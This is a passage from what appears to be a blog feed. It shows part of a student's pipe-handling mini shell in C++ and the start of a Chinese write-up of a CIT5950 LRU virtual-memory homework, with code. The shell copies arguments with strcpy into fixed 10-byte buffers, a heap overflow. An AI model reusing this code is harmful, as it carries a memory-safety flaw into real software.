EXIT_SUCCESS<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">int</span> in_fd <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// input fd</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token comment\">// split the command into multiple parts</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        vector<span class=\"token operator\">&lt;</span>string<span class=\"token operator\">></span> tokens<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        boost<span class=\"token double-colon punctuation\">::</span>algorithm<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span>tokens<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> boost<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">is_any_of</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> boost<span class=\"token double-colon punctuation\">::</span>token_compress_on<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">int</span> count <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">int</span> command_num <span class=\"token operator\">=</span> tokens<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> <span class=\"token operator\">&amp;</span>command <span class=\"token operator\">:</span> tokens<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token comment\">// initialize a pipe</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">pipe</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pipe creation failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token comment\">// prepare to run the current command</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token comment\">// get the current command</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            boost<span class=\"token double-colon punctuation\">::</span>algorithm<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token comment\">// split the command into an array of args</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            vector<span class=\"token operator\">&lt;</span>string<span class=\"token operator\">></span> args<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            boost<span class=\"token double-colon punctuation\">::</span>algorithm<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">,</span> boost<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">is_any_of</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> boost<span class=\"token double-colon punctuation\">::</span>token_compress_on<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">int</span> argc <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                cerr <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"We need a command!\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token comment\">// run the current command</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            pid_t child <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>child <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                <span class=\"token comment\">// setup the file name and input arguments</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>filename <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">c_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">[</span>argc <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> argc<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                    string args_str <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                    argv<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> args_str<span class=\"token punctuation\">.</span><span class=\"token function\">c_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                argv<span class=\"token punctuation\">[</span>argc<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">nullptr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>in_fd <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                    <span class=\"token comment\">// write the pipe value into stdin</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                    <span class=\"token function\">dup2</span><span class=\"token punctuation\">(</span>in_fd<span class=\"token punctuation\">,</span> STDIN_FILENO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>in_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>count <span class=\"token operator\">!=</span> command_num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                    <span class=\"token comment\">// write stdout to the pipe</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                    <span class=\"token function\">dup2</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> STDOUT_FILENO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>                <span class=\"token comment\">// use execvp() to run the commmand</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>                <span class=\"token function\">execvp</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>                <span class=\"token comment\">// exec didn't work, so an error must have been occurred</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>                cerr <span class=\"token operator\">&lt;&lt;</span> <span class=\"token function\">strerror</span><span class=\"token punctuation\">(</span>errno<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>                <span class=\"token keyword\">delete</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> argv<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>                <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>            <span class=\"token comment\">// wait for the child process to complete</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            <span class=\"token keyword\">int</span> status<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>            <span class=\"token function\">waitpid</span><span class=\"token punctuation\">(</span>child<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>status<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>            <span class=\"token comment\">// close the current pipe write fd</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            in_fd <span class=\"token operator\">=</span> fd<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token comment\">// // read out the pipe</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token comment\">// char buffer[BUF_SIZ];</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        <span class=\"token comment\">// int count = read(in_fd, buffer, BUF_SIZ);</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token comment\">// buffer[count] = '\\0';</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token comment\">// if (count > 0)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token comment\">// &#123;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token comment\">//     fprintf(stdout, \"%s\", buffer);</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token comment\">// &#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>in_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"$ \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token keyword\">return</span> EXIT_SUCCESS<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW3/",
            "url": "https://salvely.github.io/blog/2024/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW3/",
            "title": "HW3: LRU SimpleVM 实现记录",
            "date_published": "2024-01-04T05:27:01.000Z",
            "content_html": "<h1 id=\"overview\"><a class=\"markdownIt-Anchor\" href=\"#overview\">#</a> Overview</h1>\n<p>本作业要求实现:</p>\n<ul>\n<li>Page 对象：\n<ul>\n<li>若 Page 不在 memory 中，那么它的数据被存储在磁盘上的 <code>swap file</code>  部分。在 <code>swap file</code>  中，每一页都有对应的顺序存储的数据。</li>\n<li>可以使用 C++  <code>fstream</code>  类进行 I/O 读写。尤其是 <code>read()</code>  和 <code>write()</code>  方法。</li>\n</ul>\n</li>\n<li>PageTable 对象\n<ul>\n<li>包含多个 page 以及 <code>swap file</code></li>\n<li>这里主要要求实现 LRU 算法</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"相关文件\"><a class=\"markdownIt-Anchor\" href=\"#相关文件\">#</a> 相关文件</h1>\n<h2 id=\"page\"><a class=\"markdownIt-Anchor\" href=\"#page\">#</a> Page</h2>\n<ul>\n<li><code>Page.h</code></li>\n<li><code>Page.cc</code></li>\n<li><code>PageTemplates.cc</code></li>\n</ul>\n<h2 id=\"pagetable\"><a class=\"markdownIt-Anchor\" href=\"#pagetable\">#</a> PageTable</h2>\n<ul>\n<li><code>PageTable.h</code></li>\n<li><code>PageTable.cc</code></li>\n</ul>\n<h2 id=\"testing\"><a class=\"markdownIt-Anchor\" href=\"#testing\">#</a> Testing</h2>\n<ul>\n<li><code>test_page.cc</code></li>\n<li><code>test_pagetable.cc</code></li>\n</ul>\n<h1 id=\"实现提示\"><a class=\"markdownIt-Anchor\" href=\"#实现提示\">#</a> 实现提示</h1>\n<ul>\n<li>map, unordered_map, list, vector 结构都很有用</li>\n<li><code>fstream</code>  中的 <code>read()</code>  和 <code>write()</code>  很有用</li>\n<li>需要将 <code>uint8_t</code>  切换到 <code>char</code>  类型来使用 <code>fstream</code></li>\n<li>利用初始化列表来初始化引用类型</li>\n</ul>\n<h1 id=\"page实现\"><a class=\"markdownIt-Anchor\" href=\"#page实现\">#</a> Page 实现</h1>\n<h2 id=\"page-源码分析\"><a class=\"markdownIt-Anchor\" href=\"#page-源码分析\">#</a> Page 源码分析</h2>\n<p><code>simplevm namespace</code>  中存在一个类 <code>Page</code> ，此外还有一个 <code>uint32_t</code>  类型 ( <code>pno_t</code>  类型) 的变量，用来表示页号。 <code>Page</code>  页的解释如下:</p>\n<ul>\n<li>页对象存在 -&gt; 页被导入到 physical memory-&gt; 创建一个 <code>page</code> ，并且从 <code>swap_file</code>  中读 <code>page</code>  数据。页的数据从 <code>virtual_pno * Page::PAGE_SIZE</code>  开始</li>\n<li>页对象不存在 -&gt; 数据存储在 <code>swap_file</code>  中</li>\n<li>用户可以\n<ul>\n<li>获取数据</li>\n<li>存储数据</li>\n<li>将数据刷新到 <code>swap file</code>  中（多余的无法放入 physical memory 的虚拟内存所存储的地方）</li>\n</ul>\n</li>\n</ul>\n<p><code>Page</code>  类中包含如下 <code>public</code>  方法:</p>\n<ul>\n<li><code>Page(fstream&amp; swap_file, pno_t virtual_pno);</code>\n<ul>\n<li>构造函数，传入该 <code>page</code>  对应的 <code>swap_file</code>  和页号</li>\n<li>我们从 <code>swap_file</code>  读入页数据，刷新时将页数据写入 <code>swap_file</code></li>\n<li>页号规定了我们在 <code>swap_file</code>  的哪里写入数据</li>\n</ul>\n</li>\n<li><code>Page(const Page&amp; other);</code>\n<ul>\n<li>利用一个页来复制构造另一个页，两个页具有相同的页号和 <code>swap_file</code>  地址，但是数据是复制了的（不是引用）</li>\n</ul>\n</li>\n<li><code>~Page()</code>\n<ul>\n<li>清理声明的变量</li>\n<li>如果当前数据为 dirty 状态，那么将其刷新到对应的 <code>swap_file</code></li>\n</ul>\n</li>\n<li><code>Page&amp; operator=(const Page&amp; rhs)</code>\n<ul>\n<li>赋值函数，同复制构造函数，两个 <code>Page</code>  具有相同的 <code>swap_file</code>  和页号，但是 <code>data</code>  是被复制了的</li>\n</ul>\n</li>\n<li><code>template &lt;typename T&gt; T access(uint32_t virtual_address);</code>\n<ul>\n<li>获取该页面的值（需要考虑错误情况）</li>\n</ul>\n</li>\n<li><code>T store(uint32_t virtual address, const T&amp; to_write)</code>\n<ul>\n<li>存储值到该页面中去</li>\n</ul>\n</li>\n<li><code>bool operator&lt;(const Page&amp; rhs);</code>\n<ul>\n<li>比较两个页面顺序</li>\n</ul>\n</li>\n<li><code>pno_t pno();</code>\n<ul>\n<li>获取该页面的页号</li>\n</ul>\n</li>\n<li><code>bool dirty();</code>\n<ul>\n<li>该 page 是否为 dirty 状态 (如果有人在 flush 之后，向该 page 写过值就是 dirty)</li>\n</ul>\n</li>\n<li><code>void flush();</code>\n<ul>\n<li>如果该 page 是 dirty 状态，就把内容刷新到 <code>swap_file</code></li>\n</ul>\n</li>\n<li>变量： <code>static constexpr size_t PAGE_SIZE = 4096U;</code>\n<ul>\n<li>该 page 的大小</li>\n</ul>\n</li>\n</ul>\n<p>Page 中还包括如下 <code>private</code>  变量:</p>\n<ul>\n<li><code>fstream&amp; swap_file_;</code>\n<ul>\n<li>注意这里是个引用，一个 page 没有对 <code>swap_file</code>  的所有权，只能 access 到它，所以这里 <code>swap_file</code>  是个引用</li>\n</ul>\n</li>\n<li><code>pno_t virtual_pno_;</code>\n<ul>\n<li>该 page 的页号</li>\n</ul>\n</li>\n<li><code>uint8_t *bytes_;</code>\n<ul>\n<li>该 page 的字节内容</li>\n</ul>\n</li>\n<li><code>bool dirty_;</code>\n<ul>\n<li>该 page 是否在 flush 后被写入</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"page-设计\"><a class=\"markdownIt-Anchor\" href=\"#page-设计\">#</a> Page 设计</h2>\n<h2 id=\"pagetemplatescc实现\"><a class=\"markdownIt-Anchor\" href=\"#pagetemplatescc实现\">#</a>  <code>PageTemplates.cc</code>  实现</h2>\n<p><code>PageTemplates.cc</code>  在 <code>simplevm namespace</code>  中。源码如下:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">namespace</span> simplevm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token comment\">// TODO: implement all template member functions for Page</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// This function allows users to read various data types</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">// from the page. Trying to read a non-primitive type or use</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// a virtual address that doesn't map to this page results</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">// in undefined behaviour. You can also assume that</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">// anything being read fits in on the page we are reading</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// is not partially on another page.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\">// If you are familiar with endianness, it shouldn't be</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">// considered for this function.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">//   - virtual_address: a virtual address that maps somewhere</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">//     into the page, where we will read data of type T</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// Returns:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">//   - the data of type T that was read from the page</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">template</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">typename</span> <span class=\"token class-name\">T</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  T <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> virtual_address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>virtual_address <span class=\"token operator\">/</span> PAGE_SIZE <span class=\"token operator\">!=</span> virtual_pno_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    virtual_address <span class=\"token operator\">=</span> virtual_address <span class=\"token operator\">%</span> PAGE_SIZE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    T<span class=\"token operator\">*</span> address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>T<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>bytes_ <span class=\"token operator\">+</span> virtual_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">*</span>address<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token comment\">// This function allows users to write various data types</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token comment\">// to the page. Trying to write a non-primitive type or use</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token comment\">// a virtual address that doesn't map to this page results</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token comment\">// in undefined behaviour. You can also assume that</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token comment\">// anything being written fits on the current page</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token comment\">// is not partially on another page.</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token comment\">// If you are familiar with endianness, it shouldn't be</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token comment\">// considered for this function.</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">//   - virtual_address: a virtual address that maps somewhere</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token comment\">//     into the page, where we will read data of type T</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">//   - to_write: the data of type T to write to the page</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token comment\">// Returns: nothing</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token keyword\">template</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">typename</span> <span class=\"token class-name\">T</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">store</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> virtual_address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> T<span class=\"token operator\">&amp;</span> to_write<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>virtual_address <span class=\"token operator\">/</span> PAGE_SIZE <span class=\"token operator\">!=</span> virtual_pno_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    virtual_address <span class=\"token operator\">=</span> virtual_address <span class=\"token operator\">%</span> PAGE_SIZE<span class=\"token 